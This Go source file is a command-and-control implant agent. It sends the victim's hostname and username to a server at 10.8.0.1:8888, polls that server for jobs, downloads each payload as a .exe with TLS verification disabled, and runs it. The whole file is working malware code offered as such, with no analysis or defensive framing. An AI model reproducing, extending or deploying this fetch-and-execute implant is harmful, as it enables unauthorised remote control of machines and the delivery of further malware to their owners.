package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"time"

	"github.com/google/uuid"
)

var AuthorizationToken string
var AuthorizationTokenExpire string
var JobsQueue []string

var connectionErr = fmt.Errorf("can't connect to a C2")
var marshalErr = fmt.Errorf("can't marshal a data for json")
var requestCreationErr = fmt.Errorf("can't create a new request")
var requestSendingErr = fmt.Errorf("can't perform a request")
var responseReadingErr = fmt.Errorf("can't do io.ReadAll")
var unmarshalErr = fmt.Errorf("can't unmarshal a JSON in response")
var credentialsErr = fmt.Errorf("can't login with this credentials:")
var hostnameErr = fmt.Errorf("can't get hostname of a victim")
var usernameErr = fmt.Errorf("can't get a username on a victim")
var noJobsErr = fmt.Errorf("no jobs to run")
var fileCreationErr = fmt.Errorf("can't create a file")
var fileWritingErr = fmt.Errorf("can't write to a file")
var payloadExecutionErr = fmt.Errorf("payload execution was unsuccessful")

func AGENT() {
	JobsQueue = make([]string, 0)
	for {
		for {
			err := CHECKCONNECTION()
			if !errors.Is(err, connectionErr) {
				break
			} else {
				fmt.Println(err)
				time.Sleep(time.Second * 7)
			}
		}
		for {
			err := TRYTOCONNECT()
			if errors.Is(err, nil) {
				break
			} else {
				fmt.Println(err)
				time.Sleep(time.Second * 5)
			}
		}
		for {
			err := CHECKJOBS()
			if errors.Is(err, nil) {
				jobsStatus, jobsOut := DOJOBS()
				if len(JobsQueue) == 0 {
					// sending to api job output and status
					fmt.Println(jobsStatus)
					fmt.Println(jobsOut)
					continue
				} else {
					time.Sleep(time.Second * 10)
					fmt.Println("Sleeping for 10 secs...")
					_, _ = DOJOBS()
					if len(JobsQueue) != 0 {
						JobsQueue = []string{}
					} else {
						// sending to api job output and status
						continue
					}
				}
			} else if errors.Is(err, requestSendingErr) {
				break
			} else {
				fmt.Println(err)
				time.Sleep(time.Second * 3)
			}
		}

	}
}

func CHECKCONNECTION() error {
	conn, err := net.Dial("tcp", "10.8.0.1:8888")
	if err != nil {
		return connectionErr
	}
	defer conn.Close()
	return nil
}

func TRYTOCONNECT() error {
	id := uuid.New()
	uuid := id.String()
	hostname, err := GETHOSTNAME()
	if err != nil {
		return err
	}
	username, err := GETUSERNAME()
	if err != nil {
		return err
	}
	connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
	connectPostJson, err := json.Marshal(connectPostBody)
	if err != nil {
		return marshalErr
	}
	req, err := http.NewRequest("POST", "https://10.8.0.1:8888/connect", bytes.NewBuffer(connectPostJson))
	if err != nil {
		return requestCreationErr
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return requestSendingErr
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return responseReadingErr
	}
	var respJson struct {
		Code   int    `json:"code"`
		Expire string `json:"expire"`
		Token  string `json:"token"`
	}
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		return unmarshalErr
	}
	if respJson.Code == 200 {
		AuthorizationToken = respJson.Token
		AuthorizationTokenExpire = respJson.Expire
		return nil
	} else {
		return credentialsErr
	}
}

func GETHOSTNAME() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", hostnameErr
	}
	return hostname, nil
}

func GETUSERNAME() (string, error) {
	user, err := user.Current()
	if err != nil {
		return "", usernameErr
	}
	return user.Username, nil
}

func CHECKJOBS() error {
	req, err := http.NewRequest("GET", "https://10.8.0.1:8888/agent/jobs", nil)
	if err != nil {
		return requestCreationErr
	}
	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return requestSendingErr
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return responseReadingErr
	}
	var respJson []string
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		return unmarshalErr
	}
	if len(respJson) == 0 {
		return noJobsErr
	} else {
		JobsQueue = append(JobsQueue, respJson...)
		return nil
	}
}

func DOJOBS() (map[string]error, map[string]string) {
	jobsStatus := make(map[string]error)
	jobsOut := make(map[string]string)
	for _, job := range JobsQueue {
		req, err := http.NewRequest("GET", "https://10.8.0.1:8888/agent/payload/"+job, nil)
		if err != nil {
			jobsStatus[job] = requestCreationErr
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			jobsStatus[job] = requestSendingErr
		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			jobsStatus[job] = responseReadingErr
		}
		payloadFilename := job + ".exe"
		err = WRITETOFILE(payloadFilename, string(respBody))
		if err != nil {
			jobsStatus[job] = err
		}
		jobOut, err := RUNJOB(payloadFilename)
		if !errors.Is(err, payloadExecutionErr) {
			jobsOut[job] = string(jobOut)
		} else {
			fmt.Println(err)
			jobsStatus[job] = err
			jobsOut[job] = ""
		}
	}
	JobsQueue = []string{}
	for job, err := range jobsStatus {
		if err != nil {
			JobsQueue = append(JobsQueue, job)
		}
	}
	return jobsStatus, jobsOut
}

func WRITETOFILE(filename string, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fileCreationErr
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return fileWritingErr
	}
	return file.Sync()
}

func RUNJOB(payloadFilename string) ([]byte, error) {
	fmt.Println(payloadFilename)
	fmt.Println()
	payloadResults, err := exec.Command(".\\"+payloadFilename, "").Output()
	fmt.Println(err)
	if err != nil {
		return nil, payloadExecutionErr
	}
	return payloadResults, nil
}

func main() {
	AGENT()
}
